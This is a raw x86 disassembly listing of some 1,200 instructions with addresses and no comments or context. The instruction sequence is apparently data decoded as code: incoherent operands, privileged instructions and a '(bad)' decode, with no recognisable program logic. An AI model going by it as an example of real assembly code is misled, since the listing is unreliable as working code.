  403ef4:	and    BYTE PTR [ebx],al
  403ef6:	add    BYTE PTR [eax+0x2110090c],al
  403efc:	add    BYTE PTR [eax+0x32bc15ff],ah
  403f02:	inc    ecx
  403f03:	add    BYTE PTR [eax],dl
  403f05:	mov    BYTE PTR [edx+0x100e1056],ah
  403f0b:	add    al,BYTE PTR [eax]
  403f0d:	add    al,0xa4
  403f0f:	nop
  403f10:	mov    ds:0x1100500c,al
  403f15:	inc    eax
  403f16:	adc    esp,eax
  403f18:	add    cl,BYTE PTR [eax+0x8]
  403f1b:	add    esp,DWORD PTR [eax+0x400c4a4a]
  403f21:	test   al,0x21
  403f23:	push   cs
  403f24:	jbe    0x403f6f
  403f26:	and    BYTE PTR [eax+edx*1],al
  403f29:	xchg   BYTE PTR [eax+eax*4],ah
  403f2c:	or     dl,BYTE PTR [ebp-0x7e]
  403f2f:	pusha  
  403f30:	adc    al,0xa1
  403f32:	and    BYTE PTR [eax+eax*1],0x2
  403f36:	add    eax,edi
  403f38:	dec    eax
  403f39:	inc    esp
  403f3a:	add    dl,BYTE PTR [eax+0x64]
  403f3d:	inc    esp
  403f3e:	push   eax
  403f3f:	sbb    al,0x58
  403f41:	push   eax
  403f42:	add    BYTE PTR [eax+eax*1+0x0],ah
  403f46:	add    BYTE PTR [eax],cl
  403f48:	cmp    al,0x9
  403f4a:	pusha  
  403f4b:	and    BYTE PTR [edx],al
  403f4d:	adc    al,0x8
  403f4f:	add    BYTE PTR [eax],al
  403f51:	jns    0x403f5f
  403f53:	ja     0x403f55
  403f55:	add    eax,DWORD PTR [ecx+0x0]
  403f58:	xor    al,0x1
  403f5a:	mov    ds:0x2c540086,eax
  403f5f:	test   al,0x0
  403f61:	add    BYTE PTR [edx+eax*8+0xa0273c],0x0
  403f69:	adc    ah,BYTE PTR [eax]
  403f6b:	and    al,BYTE PTR [esi+0x10402891]
  403f71:	add    al,ah
  403f73:	add    BYTE PTR [esp+edx*1],0x44
  403f77:	or     eax,0xc0042204
  403f7c:	add    BYTE PTR [esp+eiz*8+0x402252c0],0xc0
  403f84:	inc    eax
  403f85:	nop
  403f86:	and    eax,DWORD PTR [ecx+0x3d440210]
  403f8c:	add    BYTE PTR [ecx-0x1fff7140],al
  403f92:	mov    BYTE PTR [esi],al
  403f94:	add    BYTE PTR [eax],al
  403f96:	adc    al,0x98
  403f98:	pusha  
  403f99:	rol    DWORD PTR [edx],0x80
  403f9c:	dec    ebp
  403f9d:	add    al,BYTE PTR [edx]
  403f9f:	and    BYTE PTR [edx],al
  403fa1:	rol    BYTE PTR [edx],cl
  403fa3:	and    dl,BYTE PTR [edx+0x10a83171]
  403fa9:	xchg   edx,eax
  403faa:	and    BYTE PTR [ecx],0x4a
  403fad:	sbb    cl,BYTE PTR [eax+0x50]
  403fb0:	inc    esi
  403fb1:	nop
  403fb2:	add    al,ah
  403fb4:	or     BYTE PTR [ecx],0x12
  403fb7:	mov    al,0x0
  403fb9:	mov    al,BYTE PTR [eax+0x8b2100]
  403fbf:	adc    BYTE PTR [eax],cl
  403fc1:	rol    DWORD PTR [eax],0x32
  403fc4:	add    BYTE PTR [eax-0x6d7f779c],al
  403fca:	add    BYTE PTR [ecx+eax*4+0x1090cf00],al
  403fd1:	inc    eax
  403fd2:	or     BYTE PTR [eax],ah
  403fd4:	inc    edx
  403fd5:	xor    BYTE PTR [ecx],al
  403fd7:	inc    edx
  403fd8:	sbb    BYTE PTR [eax],dh
  403fda:	add    BYTE PTR [ecx],al
  403fdc:	jo     0x40401e
  403fde:	add    al,al
  403fe0:	nop
  403fe1:	adc    DWORD PTR [ecx-0x6d7edc00],ebp
  403fe7:	adc    cl,al
  403fe9:	and    bh,BYTE PTR [eax-0x48]
  403fec:	inc    edx
  403fed:	loop   0x404021
  403fef:	xor    BYTE PTR [edx+0x44],al
  403ff2:	mov    BYTE PTR [eax],bl
  403ff4:	add    eax,DWORD PTR [edx]
  403ff6:	adc    eax,0x92806200
  403ffb:	call   0x34240b0
  404000:	sub    al,0x91
  404002:	test   al,0x8
  404004:	or     al,0x50
  404006:	and    dl,BYTE PTR [ebx]
  404008:	add    BYTE PTR [eax+0x0],al
  40400b:	add    BYTE PTR [edx],0x18
  40400e:	or     BYTE PTR [eax-0x7c],cl
  404011:	add    al,0x40
  404013:	inc    esp
  404014:	add    al,0x10
  404016:	sub    BYTE PTR [edx+ebp*1],al
  404019:	and    ah,BYTE PTR [eax]
  40401b:	push   0x44c042
  404020:	pop    edx
  404021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404022:	nop
  404023:	push   eax
  404024:	add    cl,BYTE PTR [edi]
  404026:	sub    dl,BYTE PTR [edx+ecx*2+0x10]
  40402a:	cmp    DWORD PTR [ecx+0x18884020],eax
  404030:	add    BYTE PTR [eax+0x38],al
  404033:	adc    BYTE PTR [eax],al
  404035:	cmp    eax,DWORD PTR [edx]
  404037:	nop
  404038:	loopne 0x403fc4
  40403a:	adc    al,BYTE PTR [ecx-0x5d3fe7f6]
  404040:	add    BYTE PTR [eax+eax*4],0x10
  404044:	inc    esp
  404045:	loopne 0x404058
  404047:	inc    eax
  404048:	fldenv [ecx+0x8118800]
  40404e:	inc    ecx
  40404f:	call   0xa104:0x42220420
  404056:	rcl    BYTE PTR [edx+ebx*1-0x3c],0x8
  40405b:	mov    BYTE PTR [eax],al
  40405d:	adc    BYTE PTR [eax],dh
  40405f:	push   0x854eca81
  404064:	sbb    BYTE PTR [esi+eiz*1],al
  404067:	adc    BYTE PTR [edx+0x220680c],0xc6
  40406e:	sbb    eax,0xa1581204
  404073:	and    BYTE PTR [eax],cl
  404075:	and    BYTE PTR [eax+0x4110010],al
  40407b:	and    al,BYTE PTR [eax+0x24690000]
  404081:	nop
  404082:	pop    es
  404083:	add    DWORD PTR [eax],eax
  404085:	ins    DWORD PTR es:[edi],dx
  404086:	mov    al,ds:0x80089c02
  40408b:	add    esp,DWORD PTR [eax]
  40408d:	and    cl,BYTE PTR [edx]
  40408f:	and    dl,BYTE PTR [ecx]
  404091:	push   esp
  404092:	xor    dl,0x19
  404095:	xchg   BYTE PTR [esi+0x31908000],bl
  40409b:	loopne 0x40409d
  40409d:	adc    DWORD PTR [edi+0x8f41050],esi
  4040a3:	add    al,0x12
  4040a5:	dec    eax
  4040a6:	add    BYTE PTR [edx],ah
  4040a8:	xchg   edi,eax
  4040a9:	adc    DWORD PTR [edx+0x104b0020],0x20d00863
  4040b3:	add    al,BYTE PTR [edx]
  4040b5:	and    BYTE PTR [edi+0x21],cl
  4040b8:	add    eax,0x314300
  4040bd:	rol    BYTE PTR [eax],0x57
  4040c0:	or     BYTE PTR [eax+0x27],al
  4040c3:	push   edx
  4040c4:	add    BYTE PTR [eax],bl
  4040c6:	mov    BYTE PTR [edx-0x37],al
  4040c9:	mov    BYTE PTR [ecx],dl
  4040cb:	sub    BYTE PTR [eax],cl
  4040cd:	mov    eax,ds:0x36812184
  4040d2:	add    cl,BYTE PTR [ebp+0x5106120]
  4040d8:	dec    eax
  4040d9:	pop    es
  4040da:	and    BYTE PTR [edx-0x5fb8ffec],ah
  4040e0:	add    BYTE PTR [edx],0x1
  4040e3:	inc    eax
  4040e4:	add    ecx,edx
  4040e6:	push   cs
  4040e7:	push   eax
  4040e8:	add    DWORD PTR [edx],esp
  4040ea:	or     BYTE PTR [eax+ecx*1],al
  4040ed:	and    al,0x80
  4040ef:	add    ch,BYTE PTR [eax]
  4040f1:	add    ch,al
  4040f3:	and    BYTE PTR [edx+0x8],dh
  4040f6:	inc    ecx
  4040f7:	push   es
  4040f8:	in     eax,0x80
  4040fa:	sbb    BYTE PTR [eax],dl
  4040fc:	sub    al,0x10
  4040fe:	dec    ebp
  4040ff:	and    ecx,DWORD PTR [edx+0x3c]
  404102:	inc    edx
  404103:	add    BYTE PTR [eax],ch
  404105:	push   ss
  404106:	or     DWORD PTR [ebp+0x8],eax
  404109:	push   es
  40410a:	and    BYTE PTR [eax+0x40],0x0
  40410e:	pusha  
  40410f:	add    al,dh
  404111:	add    BYTE PTR [eax],al
  404113:	inc    eax
  404114:	or     DWORD PTR [eax-0x60],eax
  404117:	add    al,BYTE PTR [edx]
  404119:	jb     0x40413f
  40411b:	xor    dl,BYTE PTR [ecx]
  40411d:	inc    eax
  40411e:	mul    DWORD PTR [edx+0x4]
  404121:	xor    BYTE PTR [esi+0x4e532c81],al
  404127:	mov    BYTE PTR [edx],ah
  404129:	add    DWORD PTR [eax+0x20],eax
  40412c:	add    eax,0x60110002
  404131:	add    al,BYTE PTR [eax]
  404133:	add    BYTE PTR [edx+0x6020904],cl
  404139:	adc    DWORD PTR [eax-0x40],ecx
  40413c:	add    DWORD PTR [ecx],eax
  40413e:	add    DWORD PTR [eax],eax
  404140:	add    BYTE PTR [eax+0x1],ah
  404143:	and    BYTE PTR [eax-0x68],cl
  404146:	add    al,BYTE PTR [edx]
  404148:	xor    DWORD PTR [eax+0x20],edx
  40414b:	pusha  
  40414c:	add    al,0x78
  40414e:	inc    esp
  40414f:	inc    eax
  404150:	push   edx
  404151:	add    BYTE PTR [eax-0x2faf9bb8],dh
  404157:	add    BYTE PTR [eax],ch
  404159:	pusha  
  40415a:	jb     0x404195
  40415c:	add    ah,ah
  40415e:	add    BYTE PTR [esp+eax*4],al
  404161:	push   ecx
  404162:	mov    cl,0x31
  404164:	and    DWORD PTR [edx+eax*1],eax
  404167:	ret    
  404168:	and    dl,BYTE PTR [eax]
  40416a:	add    BYTE PTR [esi],dl
  40416c:	leave  
  40416d:	xchg   edx,eax
  40416e:	add    BYTE PTR [eax-0x6baefddc],ah
  404174:	loop   0x404138
  404176:	and    DWORD PTR [edi+0x20400205],eax
  40417c:	inc    eax
  40417d:	adc    BYTE PTR [eax+0x42811014],cl
  404183:	or     BYTE PTR [eax+eiz*1-0x50],cl
  404187:	dec    eax
  404188:	inc    eax
  404189:	and    al,0x14
  40418b:	and    DWORD PTR [eax],ecx
  40418d:	adc    BYTE PTR ds:0xa148003,ah
  404193:	bound  eax,QWORD PTR [edx]
  404195:	mov    eax,ds:0x2c600141
  40419a:	add    eax,0x1610a953
  40419f:	add    dl,BYTE PTR [eax+0x41]
  4041a2:	and    BYTE PTR [ebx+0x1808031],dh
  4041a8:	adc    al,BYTE PTR [ecx]
  4041aa:	add    dh,BYTE PTR [ecx]
  4041ac:	xor    BYTE PTR [eax],al
  4041ae:	bound  edi,QWORD PTR [esi+0x2]
  4041b1:	push   es
  4041b2:	add    dl,al
  4041b4:	add    eax,0x0
  4041b7:	rol    BYTE PTR [ecx+0x8810248],1
  4041bd:	sbb    eax,0x809001d4
  4041c2:	inc    edx
  4041c3:	rol    DWORD PTR [esp+eax*1-0x42],0xc
  4041c8:	inc    edx
  4041c9:	pop    ecx
  4041ca:	add    BYTE PTR [eax-0x5b],ch
  4041cd:	or     BYTE PTR [eax],al
  4041cf:	aam    0x10
  4041d1:	push   0xa1245020
  4041d6:	add    al,0x0
  4041d8:	add    ah,dl
  4041da:	inc    edx
  4041db:	sbb    al,0x23
  4041dd:	inc    eax
  4041de:	sub    al,BYTE PTR [ecx]
  4041e0:	pushf  
  4041e1:	adc    BYTE PTR [eax],ch
  4041e3:	xor    BYTE PTR [eax],bl
  4041e5:	add    BYTE PTR [eax],ah
  4041e7:	and    cl,0x98
  4041ea:	add    al,0x58
  4041ec:	add    BYTE PTR [eax],0x0
  4041ef:	inc    edx
  4041f0:	aam    0x80
  4041f2:	add    BYTE PTR [eax+0x600b8916],cl
  4041f8:	add    BYTE PTR [eax],ch
  4041fa:	and    dh,BYTE PTR [edi-0x6f3f7600]
  404200:	add    bl,BYTE PTR [eax]
  404202:	add    BYTE PTR [edx],cl
  404204:	and    DWORD PTR [eax],eax
  404206:	push   cs
  404207:	add    al,0x2
  404209:	add    BYTE PTR [eax],ch
  40420b:	add    al,BYTE PTR [eax+ecx*1]
  40420e:	add    al,0x90
  404210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404211:	shr    BYTE PTR [ebx+0x320c1082],0x90
  404218:	and    BYTE PTR [eax],cl
  40421a:	adc    cl,al
  40421c:	rcl    BYTE PTR [eax+eiz*1+0x1580988],1
  404223:	xchg   ebx,eax
  404224:	add    BYTE PTR [eax],bh
  404226:	add    BYTE PTR [ecx+0x1004480],dh
  40422c:	or     al,0xc4
  40422e:	add    ecx,DWORD PTR [ecx]
  404230:	cmp    dl,BYTE PTR [eax+0x1f]
  404233:	add    DWORD PTR ds:0x48ec0000,eax
  404239:	test   BYTE PTR [ebx],al
  40423b:	add    ecx,eax
  40423d:	loopne 0x40428f
  40423f:	add    BYTE PTR [eax],ah
  404241:	inc    esp
  404242:	add    dl,BYTE PTR [edx+0x2606048]
  404248:	xor    BYTE PTR [esi+0x3a416019],0x40
  40424f:	or     BYTE PTR [eax],ah
  404251:	or     ah,BYTE PTR [edx+0x62]
  404254:	inc    ebp
  404255:	cwde   
  404256:	or     eax,0x80090148
  40425b:	adc    BYTE PTR [edx+ecx*1],al
  40425e:	push   eax
  40425f:	add    BYTE PTR [eax],ah
  404261:	push   ecx
  404262:	mov    BYTE PTR [ecx],al
  404264:	fiadd  DWORD PTR [eax+0x4]
  404267:	les    eax,FWORD PTR [eax]
  404269:	or     al,0xc7
  40426b:	and    BYTE PTR [eax+0x62108222],bl
  404271:	add    BYTE PTR [eax+edx*2],al
  404274:	add    al,0x21
  404276:	or     BYTE PTR [esi+0x218e5019],dl
  40427c:	les    ebx,FWORD PTR [ebx]
  40427e:	adc    DWORD PTR [ebx+0x12],eax
  404281:	add    BYTE PTR [ecx],0x40
  404284:	add    BYTE PTR [eax],cl
  404286:	adc    al,BYTE PTR [esi]
  404288:	add    al,BYTE PTR [eax+0x64]
  40428b:	dec    ecx
  40428c:	and    ah,BYTE PTR [ebp+0x800072]
  404292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404293:	push   cs
  404294:	or     DWORD PTR [ebx],0x660c084c
  40429a:	shr    BYTE PTR [ecx+0x1425e00],0x80
  4042a1:	add    BYTE PTR [ebx],al
  4042a3:	mov    al,al
  4042a5:	add    BYTE PTR [ecx],ah
  4042a7:	add    BYTE PTR [eax+0x40122842],al
  4042ad:	cmp    DWORD PTR [ebp-0x7ff7cfde],eax
  4042b3:	mov    eax,0x22413441
  4042b8:	inc    eax
  4042b9:	add    al,BYTE PTR [edx+0x3720a040]
  4042bf:	add    BYTE PTR [ecx],0x0
  4042c2:	push   edx
  4042c3:	or     DWORD PTR [eax],eax
  4042c5:	xor    BYTE PTR [eax+0x34208000],al
  4042cb:	add    BYTE PTR [eax],cl
  4042cd:	add    BYTE PTR [ecx+0x51],cl
  4042d0:	add    al,BYTE PTR [edx+0x1]
  4042d3:	test   al,0x80
  4042d5:	or     al,0x2
  4042d7:	or     DWORD PTR ds:0x48007500,eax
  4042dd:	and    BYTE PTR [ecx],0x16
  4042e0:	test   DWORD PTR [eax-0x54],edx
  4042e3:	and    cl,BYTE PTR [eax+0x220406]
  4042e9:	push   esp
  4042ea:	inc    edx
  4042eb:	or     DWORD PTR [eax+0x8508480],eax
  4042f1:	push   cs
  4042f2:	inc    ecx
  4042f3:	inc    edx
  4042f4:	or     DWORD PTR [edx],eax
  4042f6:	or     BYTE PTR [esi+0x7163c022],bl
  4042fc:	push   0x9
  4042fe:	sub    BYTE PTR [eax],al
  404300:	or     BYTE PTR [ebx+0x44404680],dl
  404306:	test   eax,0xa4920821
  40430b:	inc    eax
  40430c:	add    BYTE PTR [ecx+0x0],dl
  40430f:	adc    DWORD PTR [eax],eax
  404311:	jl     0x404323
  404313:	adc    eax,DWORD PTR [eax+0x804180]
  404319:	add    cl,cl
  40431b:	and    al,0xc0
  40431d:	push   eax
  40431e:	inc    ecx
  40431f:	add    al,0x1d
  404321:	xor    BYTE PTR [ebx+0x20081041],0x8
  404328:	inc    ebx
  404329:	inc    eax
  40432a:	and    DWORD PTR [esi+edx*4],0x1007084a
  404331:	or     bl,BYTE PTR [eax]
  404333:	or     BYTE PTR [ecx+0x40a418b0],bl
  404339:	adc    BYTE PTR [eax],dl
  40433b:	sub    BYTE PTR [eax-0x60],dl
  40433e:	or     DWORD PTR [ecx],eax
  404340:	add    al,0x4
  404342:	sbb    al,BYTE PTR [ebx]
  404344:	inc    edx
  404345:	add    BYTE PTR [esi+0x10],dh
  404348:	test   BYTE PTR [eax],ah
  40434a:	inc    ecx
  40434b:	add    al,0x22
  40434d:	xor    BYTE PTR [ecx],cl
  40434f:	add    BYTE PTR [eax+ebp*1+0x4],dl
  404353:	or     BYTE PTR [eax-0x1c],al
  404356:	inc    edx
  404357:	mov    al,ds:0xc29e2041
  40435c:	push   ss
  40435d:	or     ah,BYTE PTR [eax]
  40435f:	test   DWORD PTR [eax+0x10e80058],eax
  404365:	loopne 0x4043b0
  404367:	add    BYTE PTR [ecx+0x4],al
  40436a:	add    BYTE PTR [eax],ah
  40436c:	sbb    al,BYTE PTR [ecx]
  40436e:	push   esp
  40436f:	inc    eax
  404370:	inc    eax
  404371:	add    dl,BYTE PTR [edx]
  404373:	add    BYTE PTR [eax],al
  404375:	add    BYTE PTR [edi+0x5154938],al
  40437b:	adc    al,0x5
  40437d:	inc    edx
  40437e:	or     al,BYTE PTR [edx]
  404380:	sub    al,0x2
  404382:	or     eax,esp
  404384:	pop    ebx
  404385:	sub    BYTE PTR [eax],al
  404387:	xchg   ebp,eax
  404388:	and    al,0xc
  40438a:	add    al,bl
  40438c:	add    BYTE PTR [ebx],al
  40438e:	sub    BYTE PTR [ecx],cl
  404390:	xchg   esp,eax
  404391:	test   DWORD PTR [eax+eax*2],esp
  404394:	test   al,ah
  404396:	jmp    0x134143a1
  40439b:	add    eax,DWORD PTR [ecx]
  40439d:	shl    BYTE PTR [ebx],0x1
  4043a0:	pusha  
  4043a1:	xor    BYTE PTR [eax],al
  4043a3:	and    BYTE PTR [ecx],dh
  4043a5:	dec    ecx
  4043a6:	or     eax,0x1938008
  4043ab:	or     BYTE PTR [eax+0x3086aa15],cl
  4043b1:	test   al,al
  4043b3:	inc    eax
  4043b4:	and    BYTE PTR [eax],ch
  4043b6:	xor    DWORD PTR [eax+0x1208056b],eax
  4043bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043bd:	or     DWORD PTR [eax],eax
  4043bf:	and    al,al
  4043c1:	and    BYTE PTR [eax+0x4e0a288],cl
  4043c7:	nop
  4043c8:	add    BYTE PTR [edx],al
  4043ca:	or     al,0xc0
  4043cc:	and    al,0x2a
  4043ce:	mov    al,0x67
  4043d0:	sub    al,0x23
  4043d2:	test   BYTE PTR [eax],al
  4043d4:	add    dl,BYTE PTR [eax]
  4043d6:	ret    
  4043d7:	inc    ebp
  4043d8:	enter  0x304,0xc9
  4043dc:	nop
  4043dd:	sub    al,0xb6
  4043df:	or     BYTE PTR [eax+0x4],dl
  4043e2:	and    BYTE PTR [eax],bl
  4043e4:	push   ecx
  4043e5:	add    DWORD PTR [eax+0x1d062a1b],0x20
  4043ec:	add    BYTE PTR [ebx],dh
  4043ee:	and    BYTE PTR [eax+edi*4],0x58
  4043f2:	add    BYTE PTR [eax+0x200000c0],0x42
  4043f9:	add    BYTE PTR [eax],al
  4043fb:	inc    ebp
  4043fc:	les    eax,FWORD PTR [edx-0x6fa65dfe]
  404402:	pusha  
  404403:	inc    esi
  404404:	add    BYTE PTR [eax],dl
  404406:	or     DWORD PTR [eax],eax
  404408:	xor    BYTE PTR [eax+0x280050db],al
  40440e:	add    BYTE PTR [eax-0x7eafdb77],ch
  404414:	add    ecx,DWORD PTR [eax+0x10c015c]
  40441a:	and    ebx,DWORD PTR [eax+0x3a23408]
  404420:	mov    al,ds:0x602218
  404425:	or     dl,BYTE PTR [eax+edx*1+0x28109480]
  40442c:	inc    esp
  40442d:	adc    DWORD PTR [eax],eax
  40442f:	mov    dl,0x88
  404431:	add    al,al
  404433:	add    DWORD PTR [eax],edx
  404435:	and    DWORD PTR [ebx],eax
  404437:	add    al,BYTE PTR [esi+0x20]
  40443a:	and    al,BYTE PTR [eax+0x4]
  40443d:	adc    DWORD PTR [eax+eax*1+0x0],edx
  404441:	add    eax,edx
  404443:	or     BYTE PTR [eax],0x91
  404446:	and    BYTE PTR [eax],ah
  404448:	les    edx,FWORD PTR [edx-0x30]
  40444b:	test   eax,0xb8a810c6
  404450:	and    BYTE PTR ss:[edx],0xdc
  404454:	pusha  
  404455:	sbb    DWORD PTR [ebx],eax
  404457:	add    BYTE PTR [eax-0x7b],bl
  40445a:	dec    eax
  40445b:	jbe    0x4044ae
  40445d:	adc    BYTE PTR [ebp+0x25958020],al
  404463:	ror    BYTE PTR [esi+0x8],0xc0
  404467:	pusha  
  404468:	and    BYTE PTR [eax],al
  40446a:	add    bl,dl
  40446c:	pusha  
  40446d:	or     al,al
  40446f:	inc    edx
  404470:	add    al,0x25
  404472:	les    ebx,FWORD PTR [ebx]
  404474:	and    BYTE PTR [eax+0x8],al
  404477:	imul   edx,DWORD PTR [eax],0x20981f
  40447d:	add    BYTE PTR [eax],al
  40447f:	mul    BYTE PTR [eax+0x4250031]
  404485:	add    BYTE PTR [eax+0x1],dl
  404488:	add    BYTE PTR [edi-0x77fff766],ah
  40448e:	add    BYTE PTR [ecx],0x10
  404491:	clts   
  404493:	adc    BYTE PTR [eax],ah
  404495:	rol    BYTE PTR [edx],0x20
  404498:	add    dl,BYTE PTR [eax+0x10]
  40449b:	sbb    DWORD PTR [edx+eax*1],eax
  40449e:	inc    esp
  40449f:	rol    BYTE PTR [edx+0x40],1
  4044a2:	xor    BYTE PTR [eax-0x68],al
  4044a5:	and    BYTE PTR [eax+0x40],0x14
  4044a9:	add    al,BYTE PTR [eax+0x60ae000d]
  4044af:	add    DWORD PTR [ecx+0x40],0x8800a41
  4044b6:	add    ah,al
  4044b8:	adc    BYTE PTR [ebx],ah
  4044ba:	and    al,0x90
  4044bc:	pusha  
  4044bd:	xor    BYTE PTR [ecx],0x9
  4044c0:	add    BYTE PTR [esi],dl
  4044c2:	nop
  4044c3:	adc    DWORD PTR [eax+0x40],eax
  4044c6:	add    cl,al
  4044c8:	inc    eax
  4044c9:	add    al,0xd4
  4044cb:	pop    ebx
  4044cc:	and    DWORD PTR [eax],0x110829c0
  4044d2:	add    esp,ecx
  4044d4:	add    al,0x10
  4044d6:	bound  eax,QWORD PTR [edx]
  4044d8:	inc    esp
  4044d9:	ins    WORD PTR es:[edi],dx
  4044db:	dec    esp
  4044dc:	pusha  
  4044dd:	add    al,0x10
  4044df:	or     dl,BYTE PTR [edx]
  4044e1:	inc    edx
  4044e2:	adc    ecx,DWORD PTR [edx]
  4044e4:	call   0x35645d71
  4044e9:	add    BYTE PTR [ebx+eax*1+0xc608014],al
  4044f0:	adc    DWORD PTR [edx+0x4],esp
  4044f3:	add    BYTE PTR [ebx],ah
  4044f5:	or     BYTE PTR [eax-0x7ffdc7b8],dh
  4044fb:	pusha  
  4044fc:	and    al,BYTE PTR [eax]
  4044fe:	add    BYTE PTR [eax+0x31],al
  404501:	cwde   
  404502:	ror    BYTE PTR [eax-0x7baabf10],cl
  404508:	inc    eax
  404509:	adc    BYTE PTR ds:0x8601d018,al
  40450f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404510:	js     0x4044d3
  404512:	inc    edx
  404513:	adc    DWORD PTR [eax],eax
  404515:	push   ebx
  404516:	push   edi
  404517:	add    BYTE PTR [eax-0x3f],cl
  40451a:	add    BYTE PTR [ebp+ecx*4-0x62eef99e],al
  404521:	test   DWORD PTR [eax+eax*1],eax
  404524:	add    BYTE PTR [edx-0x60],0x0
  404528:	rol    BYTE PTR [eax],1
  40452a:	sub    BYTE PTR [eax],al
  40452c:	add    BYTE PTR [eax],al
  40452e:	dec    edx
  40452f:	add    BYTE PTR [eax],dl
  404531:	bound  ecx,QWORD PTR [eax+0x2]
  404534:	inc    ebp
  404535:	and    al,BYTE PTR [ecx]
  404537:	add    ebp,DWORD PTR [ecx]
  404539:	push   edx
  40453a:	sbb    BYTE PTR [ecx-0x60],al
  40453d:	gs rcl al,1
  404540:	(bad)  
  404541:	and    BYTE PTR [ecx],al
  404543:	add    BYTE PTR [eax],al
  404545:	adc    DWORD PTR [ecx+0x4],eax
  404548:	and    al,BYTE PTR [edx+0x3002010]
  40454e:	or     DWORD PTR ds:0x88484ca3,esp
  404554:	or     BYTE PTR ds:0x54050,al
  40455a:	dec    esp
  40455b:	add    DWORD PTR [ebx+0x8],ebp
  40455e:	inc    eax
  40455f:	add    al,0xc8
  404561:	add    DWORD PTR [eax+0x28],esp
  404564:	inc    eax
  404565:	add    BYTE PTR [eax+eax*1],bl
  404568:	add    DWORD PTR [edx+ecx*2+0x2500020],ebx
  40456f:	sbb    BYTE PTR [ecx],cl
  404571:	push   esi
  404572:	pop    esp
  404573:	mov    eax,ds:0xbc002200
  404578:	nop
  404579:	add    BYTE PTR [eax],al
  40457b:	add    DWORD PTR [ecx],esp
  40457d:	xchg   ebx,eax
  40457e:	add    BYTE PTR [edx],dl
  404580:	cmp    al,0x44
  404582:	adc    BYTE PTR [eax],al
  404584:	add    BYTE PTR [edx+ebp*2],bh
  404587:	add    BYTE PTR [eax+eax*1],cl
  40458a:	add    dl,BYTE PTR [ecx+0x4e140100]
  404590:	rol    BYTE PTR [eax],0xa0
  404593:	and    BYTE PTR [eax+0x1852082],al
  404599:	add    BYTE PTR [eax+0x28],al
  40459c:	xor    BYTE PTR [ecx+0x61],ah
  40459f:	add    eax,0x4c001c04
  4045a4:	or     DWORD PTR [esp+ecx*1],eax
  4045a7:	pop    ecx
  4045a8:	add    al,BYTE PTR [eax+0xa6144]
  4045ae:	add    al,0x0
  4045b0:	or     DWORD PTR [eax],edx
  4045b2:	mov    eax,esp
  4045b4:	or     BYTE PTR [ebx],al
  4045b6:	add    BYTE PTR [eax+0x20],0x11
  4045ba:	add    al,BYTE PTR [edx]
  4045bc:	adc    DWORD PTR [eax],edx
  4045be:	test   BYTE PTR [eax],al
  4045c0:	inc    esp
  4045c1:	xor    al,0x84
  4045c3:	jb     0x404546
  4045c5:	or     BYTE PTR [eax+0x10],al
  4045c8:	mov    ds:0x920b264c,al
  4045cd:	adc    eax,0x69c01402
  4045d2:	add    DWORD PTR [eax+edx*4],esp
  4045d5:	and    DWORD PTR [ecx],eax
  4045d7:	xchg   ecx,eax
  4045d8:	call   0x8a5946b3
  4045dd:	add    BYTE PTR [ecx],al
  4045df:	or     BYTE PTR es:[edx+esi*1],dl
  4045e3:	inc    ebx
  4045e4:	pusha  
  4045e5:	bound  eax,QWORD PTR [edx+0x31c40110]
  4045eb:	shl    BYTE PTR [ecx],0x14
  4045ee:	adc    BYTE PTR [eax],al
  4045f0:	adc    DWORD PTR [eax+0x41050043],eax
  4045f6:	add    BYTE PTR [eax],ch
  4045f8:	and    al,0x1
  4045fa:	add    BYTE PTR [edx+eax*4+0x28100c0],ah
  404601:	or     dl,BYTE PTR [eax]
  404603:	inc    eax
  404604:	and    BYTE PTR [eax],dl
  404606:	adc    BYTE PTR [edx+0xa028098],0x63
  40460d:	add    BYTE PTR [eax-0x7f7ebee6],dl
  404613:	sub    al,0x4
  404615:	inc    eax
  404616:	or     BYTE PTR [eax],al
  404618:	inc    eax
  404619:	rol    BYTE PTR [ecx],0x49
  40461c:	inc    eax
  40461d:	inc    esi
  40461e:	mov    ds:0x1a501422,al
  404623:	inc    eax
  404624:	sbb    al,0x90
  404626:	test   BYTE PTR [edx+0x10],al
  404629:	or     BYTE PTR [ecx*2+0x803902c],al
  404630:	sub    BYTE PTR [eax+ecx*8],0x0
  404634:	add    al,0x3
  404636:	inc    esp
  404637:	adc    bh,BYTE PTR [ecx]
  404639:	and    eax,0x60241912
  40463e:	xor    BYTE PTR [eax],0x88
  404641:	push   ebp
  404642:	xor    BYTE PTR [edx],0xd8
  404645:	add    BYTE PTR [eax+0x31],bh
  404648:	mov    dh,0xf
  40464a:	inc    esp
  40464b:	add    al,0x1
  40464d:	mov    ebp,ebx
  40464f:	enter  0x2c00,0x19
  404653:	lods   eax,DWORD PTR ds:[esi]
  404654:	add    BYTE PTR [eax],al
  404656:	dec    eax
  404657:	xchg   ebp,eax
  404658:	or     al,BYTE PTR [edx-0x35deeefb]
  40465e:	popa   
  40465f:	add    BYTE PTR [edx+0x44243200],al
  404665:	add    BYTE PTR [eax],al
  404667:	xchg   ebp,eax
  404668:	push   ecx
  404669:	add    dl,BYTE PTR [eax]
  40466b:	adc    DWORD PTR [eax],eax
  40466d:	add    BYTE PTR [eax],al
  40466f:	add    BYTE PTR [eax-0x3e7f796f],ah
  404675:	add    edx,DWORD PTR [edx]
  404677:	adc    BYTE PTR [eax],dh
  404679:	mov    cl,0x28
  40467b:	push   eax
  40467c:	lea    eax,[eax-0x7d7d7eb7]
  404682:	add    DWORD PTR [ecx],esp
  404684:	add    al,BYTE PTR [eax]
  404686:	sbb    BYTE PTR [eax+0x811908b],ah
  40468c:	or     BYTE PTR [eax+0x0],dh
  40468f:	adc    BYTE PTR [ebx],bh
  404691:	sbb    ecx,esp
  404693:	or     DWORD PTR [eax+0x12824601],esp
  404699:	add    DWORD PTR [ecx],ebx
  40469b:	and    BYTE PTR [edx],al
  40469d:	add    BYTE PTR [edx+ebx*1],0xb
  4046a1:	mov    BYTE PTR [eax],al
  4046a3:	pop    es
  4046a4:	dec    edx
  4046a5:	imul   edx,DWORD PTR [eax],0x40001b44
  4046ab:	add    BYTE PTR [eax],0x60
  4046ae:	shl    ah,0x40
  4046b1:	inc    esp
  4046b2:	add    ebx,DWORD PTR [eax+0x60404e0c]
  4046b8:	rcl    BYTE PTR [esi],cl
  4046ba:	and    BYTE PTR [eax+0x22],al
